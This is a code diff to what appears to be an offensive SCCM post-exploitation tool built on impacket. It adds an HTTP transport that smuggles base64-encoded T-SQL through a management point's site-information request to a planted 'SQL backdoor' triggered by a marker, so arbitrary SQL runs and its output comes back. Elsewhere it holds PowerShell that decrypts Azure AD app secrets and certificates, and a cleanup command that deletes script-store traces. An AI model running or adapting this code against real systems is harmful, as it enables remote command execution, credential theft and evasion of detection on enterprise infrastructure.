@@ -1,34 +1,164 @@
 #!/usr/bin/env python3
 
 import argparse
-import sys
+import cmd
 import logging
 import os
-import cmd
+import re
+import sys
 import uuid
+import zlib
+from base64 import b64decode, b64encode
+from binascii import hexlify, unhexlify
+from datetime import datetime
+from hashlib import sha256
+from json import loads
+from time import sleep
+
+import requests
+import urllib3
+from impacket import tds, version
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
-from impacket import version, tds
-from datetime import datetime
-from binascii import hexlify, unhexlify
-from base64 import b64encode
-from hashlib import sha256
-from time import sleep
-from json import loads
+from requests_toolbelt import multipart
+from tabulate import tabulate
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 
 def now():
     return datetime.utcnow().strftime("%Y%m%d-%H%M%S")
 
+
+
+class SCCM_SQL_HTTP:
+
+    marker = 'X509'
+
+    dummy_package_id = f"UID:{uuid.uuid4()}"
+
+    tpl_multipart = b"--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n%b\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n%b\r\n--aAbBcCdDv1234567890VxXyYzZ--"
+
+    tpl_msg = f"""<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{{LENGTH}}" Offset="0" /><CorrelationID>{{{{00000000-0000-0000-0000-000000000000}}}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{{{00000000-0000-0000-0000-000000000000}}}}</ID><Payload Type="inline"/><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:dummyEndpoint:LS_ReplyLocations</ReplyTo><TargetAddress>mp:[http]{{TARGET_ENDPOINT}}</TargetAddress><TargetEndpoint>{{TARGET_ENDPOINT}}</TargetEndpoint><TargetHost>{{TARGET}}</TargetHost><Timeout>60000</Timeout><SourceID>{{MACHINE_ID}}</SourceID></Msg>"""
+
+    tpl_SiteInformationRequest = """<SiteInformationRequest><SiteCode Name="{SITECODE}" /></SiteInformationRequest>\x00"""
+
+    tpl_stager = """
+DECLARE @b NVARCHAR(MAX) = '{BASE64}';
+DECLARE @f BIT = {FLAG};
+DECLARE @result VARCHAR(MAX) = '';
+DECLARE @err VARCHAR(MAX) = '';
+DECLARE @s NVARCHAR(MAX) = CAST(dbo.fnConvertBase64StringToBinary(@b) as VARCHAR(MAX));
+DECLARE @json VARCHAR(MAX);
+DECLARE @bin VARBINARY(MAX);
+BEGIN TRY
+IF @f = 0
+BEGIN
+    EXEC (@s);
+END
+ELSE
+BEGIN
+    SET @s = N'SET @result=(' + @s + N' FOR JSON PATH)';
+    EXEC sp_executesql @s, N'@result VARCHAR(MAX) OUTPUT', @result = @result OUTPUT;
+END
+END TRY
+BEGIN CATCH
+    SET @err= ERROR_MESSAGE();
+END CATCH 
+SET @json = (SELECT @result as rows, @@ROWCOUNT as rc, @err AS err FOR JSON PATH)
+SET @result = '<SecurityConfiguration>'+dbo.fnConvertBinaryToBase64String(CONVERT(VARBINARY(MAX), @json))+'</SecurityConfiguration>';
+SELECT s.SiteCode, s.Version as Version, s.BuildNumber, @result as Settings, isnull(s.DefaultMP, N'') as DefaultMP, CONVERT(nvarchar(max),s.Capabilities) as Capabilities FROM Sites s
+"""
+
+
+    def __init__(self, target, key, cert, marker="X509", altAuth=False):
+        self._target = target
+        self._target_url = f"{target}/ccm_system_altauth/request" if altAuth else f"{target}/ccm_system/request"
+        self._pkey = key
+        self._cert = cert
+        self.marker = marker
+
+
+    def __ccm_post(self, data):
+        headers = {"User-Agent": "ConfigMgr Messaging HTTP Sender", "Content-Type": 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'}
+        
+        #print(f">>>> HTTP Request <<<<<\n{data.decode('utf-16-le')}\n")
+        r = requests.request("CCM_POST", f"{self._target_url}", headers=headers, data=data, verify=False, cert=(self._cert, self._pkey))
+        logging.debug(f">>>> Response : {r.status_code} {r.reason} <<<<<\n{r.text[:8000]}\n")
+        try:
+            multipart_data = multipart.decoder.MultipartDecoder.from_response(r)
+            for part in multipart_data.parts:
+                if part.headers[b'content-type'] == b'application/octet-stream':
+                    deflatedData = zlib.decompress(part.content).decode('utf-16')
+                    logging.debug(deflatedData)
+        except Exception as e:
+            logging.error(e)
+            deflatedData = ""
+            pass
+        return deflatedData
+
+
+    def __ccm_system_request(self, header, request):
+        multipart_body = self.tpl_multipart % (header.encode("utf-16"), zlib.compress(request))
+
+        # print(f">>>> Header <<<<<\n{header}\n")
+        logging.debug(f">>>> Request <<<<<\n{request.decode()}\n")
+
+        return self.__ccm_post(multipart_body)
+
+    # MP_GetSiteInfo
+    def sql_query(self, sql_query):
+        logging.debug(f"SQL QUERY: {sql_query}")
+        select_flag = sql_query.lower().startswith('select')
+        stager = self.tpl_stager.format(BASE64=b64encode(sql_query.encode()).decode(), FLAG=1 if select_flag else 0)
+        # print(stager)
+        client_fqdn = f"{self.marker}:{b64encode(stager.encode()).decode()}"
+        request_body = self.tpl_SiteInformationRequest.format(SITECODE=client_fqdn)
+        request = b"%s\r\n" % request_body.encode('utf-16')[2:]
+        header = self.tpl_msg.format(LENGTH=len(request) - 2, TARGET=self._target, TARGET_ENDPOINT="MP_LocationManager", MACHINE_ID=self.dummy_package_id)
+        resp = self.__ccm_system_request(header, request)
+
+        r = re.findall("<SecurityConfiguration>([^<]+)</SecurityConfiguration>", resp)
+        if len(r):
+            match =  r[0]
+            logging.debug(f"Got Output")
+            output = loads(b64decode(match).decode(encoding='latin1', errors='backslashreplace'))[0]
+            logging.debug(output)
+            try:
+                self.rows = loads(output.get('rows', '[]'))
+            except:
+                self.rows = []
+            self.rowcount = output.get('rc', None)
+            self.error = output.get('err', None)
+            return self.rows
+        else:
+            logging.error("Failed to get output in response, SQL backdoor not present or wrong marker")
+            return None
+        
+    def printRows(self):
+        print(tabulate(self.rows, headers="keys", tablefmt="grid"))
+        self.rows =  []
+
+    def printReplies(self):
+        # TODO: handle errors here
+        if self.error is not None:
+            logging.error(self.error)
+            self.error = None
+
+    def disconnect(self):
+        pass
+
+
 class SCCM_SQLSHELL(cmd.Cmd):
 
     # On MP, the path is different, delete from current location too
-    _clean_scriptstore_cmd = 'Remove-Item C:\Windows\CCM\ScriptStore\{guid}_*\nRemove-Item ./{guid}_*'
+    _clean_scriptstore_cmd = 'Remove-Item ./{guid}_*'
     _clean_scriptstore = True
 
 
-    _crypto_decrypt_useSiteSystemKey = """Add-Type -Path "$env:SMS_LOG_PATH\..\\bin\X64\microsoft.configurationmanager.azureaddiscovery.dll"\n$ss = [Microsoft.ConfigurationManager.AzureADDiscovery.Utilities]::GetDecryptedAppSecretKey("{BLOB}")\n[Microsoft.ConfigurationManager.AzureADDiscovery.Utilities]::ConvertToPlainString($ss)"""
+    _crypto_decrypt_useSiteSystemKey = """Add-Type -Path "$env:SMS_LOG_PATH\\..\\bin\\X64\\microsoft.configurationmanager.azureaddiscovery.dll"\n$ss = [Microsoft.ConfigurationManager.AzureADDiscovery.Utilities]::GetDecryptedAppSecretKey("{BLOB}")\n[Microsoft.ConfigurationManager.AzureADDiscovery.Utilities]::ConvertToPlainString($ss)"""
 
-    _crypto_decrypt = """Add-Type -Path "$env:SMS_LOG_PATH\..\\bin\X64\microsoft.configurationmanager.cloudservicesmanager.dll"\n[Microsoft.ConfigurationManager.CloudServicesManager.Utility]::GetCertificateContent("{BLOB}", [ref]$null)"""
+    _crypto_decrypt = """Add-Type -Path "$env:SMS_LOG_PATH\\..\\bin\\X64\\microsoft.configurationmanager.cloudservicesmanager.dll"\n[Microsoft.ConfigurationManager.CloudServicesManager.Utility]::GetCertificateContent("{BLOB}", [ref]$null)"""
 
     _script_name = 'CMPivot'
 
@@ -56,6 +186,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
             self._site_code = site_code_dbname.split("CM_")[1]
             logging.info(f"Found SCCM site DB: {site_code_dbname}")
             self.sql_query(f"use CM_{self._site_code}")
+            self.sql.currentDB = f"CM_{self._site_code}"
         except:
             logging.error(f"Failed to find an SSCM DB: CM_{site_code}")
             exit(0)
@@ -583,11 +714,13 @@ class SCCM_SQLSHELL(cmd.Cmd):
             logging.error("Failed to load PowerShell script")
             logging.error(e)
 
-if __name__ == "__main__":
+def main():
+    default_marker = "RSA"
 
     parser = argparse.ArgumentParser(add_help=True, description="SCCM MSSQL client (SSL supported).")
 
     parser.add_argument("target", action="store", help="[[domain/]username[:password]@]<targetName or address>")
+    parser.add_argument("-http", action="store_true", default=False, help="Use HTTP transport (backdoor)")
     parser.add_argument("-port", action="store", default="1433", help="target MSSQL port (default 1433)")
     parser.add_argument("-db", action="store", help="MSSQL database instance (default None)")
     parser.add_argument("-windows-auth", action="store_true", default=False, help="whether or not to use Windows " "Authentication (default False)")
@@ -622,6 +755,11 @@ if __name__ == "__main__":
                     help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                         'This is useful when target is the NetBIOS name and you cannot resolve it')
 
+    group = parser.add_argument_group("HTTP transport via SQL backdoor")
+    group.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint")
+    group.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor")
+
+
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
@@ -639,34 +777,39 @@ if __name__ == "__main__":
 
     domain, username, password, remoteName = parse_target(options.target)
 
-    if domain is None:
-        domain = ""
+    if options.http:
+        logging.getLogger('chardet.charsetprober').setLevel(logging.INFO)
+        ms_sql = SCCM_SQL_HTTP(remoteName, None, None, marker=options.marker, altAuth=options.altauth)
+        res = True
+    else:
+        if domain is None:
+            domain = ""
 
-    if password == "" and username != "" and options.hashes is None and options.no_pass is False and options.aesKey is None:
-        from getpass import getpass
+        if password == "" and username != "" and options.hashes is None and options.no_pass is False and options.aesKey is None:
+            from getpass import getpass
 
-        password = getpass("Password:")
+            password = getpass("Password:")
 
-    if options.aesKey is not None:
-        options.k = True
-    
-    if options.target_ip is None:
-        options.target_ip = remoteName
+        if options.aesKey is not None:
+            options.k = True
+        
+        if options.target_ip is None:
+            options.target_ip = remoteName
 
-    ms_sql = tds.MSSQL(options.target_ip, int(options.port), remoteName)
-    ms_sql.connect()
-    try:
-        if options.k is True:
-            res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey, kdcHost=options.dc_ip)
-        else:
-            res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
-        ms_sql.printReplies()
-    except Exception as e:
-        logging.debug("Exception:", exc_info=True)
-        logging.error(str(e))
-        res = False
+        ms_sql = tds.MSSQL(options.target_ip, int(options.port), remoteName)
+        ms_sql.connect()
+        try:
+            if options.k is True:
+                res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey, kdcHost=options.dc_ip)
+            else:
+                res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
+            ms_sql.printReplies()
+        except Exception as e:
+            logging.debug("Exception:", exc_info=True)
+            logging.error(str(e))
+            res = False
     if res is True:
-        shell = SCCM_SQLSHELL(ms_sql, options.site, options.show, options.script)
+        shell = SCCM_SQLSHELL(ms_sql, options.site, options.show, options.script, clean_scriptstore=True)
         if options.file is None:
             shell.cmdloop()
         else:
@@ -674,3 +817,7 @@ if __name__ == "__main__":
                 logging.info("SQL> %s" % line, end=" ")
                 shell.onecmd(line)
     ms_sql.disconnect()
+
+
+if __name__ == "__main__":
+    main()
